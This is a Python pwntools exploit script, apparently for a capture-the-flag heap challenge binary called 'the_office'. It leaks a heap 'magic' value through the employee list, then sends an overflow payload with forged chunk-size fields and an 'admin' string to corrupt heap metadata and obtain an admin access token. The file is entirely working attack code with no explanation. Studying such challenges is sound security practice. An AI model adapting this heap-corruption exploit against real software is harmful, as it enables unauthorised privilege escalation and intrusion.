import sys, re, struct, time
sys.path.insert(0, ".")
from pwn import context, process
context.log_level = "error"
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "./_z_172_exploit2.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

io = process("./the_office")
io.recvuntil(b"4) Get access token")
ex.add(io, b"A", email=b"a" * 28, salary=1000, phone=b"111")
ex.remove(io, 0)
ex.add(io, b"B", salary=2000, phone=b"222")
ex.add(io, b"C", salary=3000, phone=b"333")
out = ex.listemps(io).decode("latin-1")
magic = int(re.findall(r"Bldg #: (\d+)", out)[-1])
print("magic = 0x%08x" % magic)
ex.remove(io, 0)
payload = b"A" * 28 + struct.pack("<I", magic) + struct.pack("<I", 0x35) * 2 + b"admin\x00"
ex.add(io, b"D", salary=4000, phone=payload)
print("list:", ex.listemps(io).decode("latin-1")[:400])
for idx in (b"0", b"1"):
    io.sendline(b"4")
    io.recvuntil(b"Employee #?")
    io.sendline(idx)
    time.sleep(0.4)
    try:
        r = io.recv(65536, timeout=2)
    except Exception as e:
        r = b"<timeout>"
    print("index", idx, "->", repr(r[:200]))
io.close()
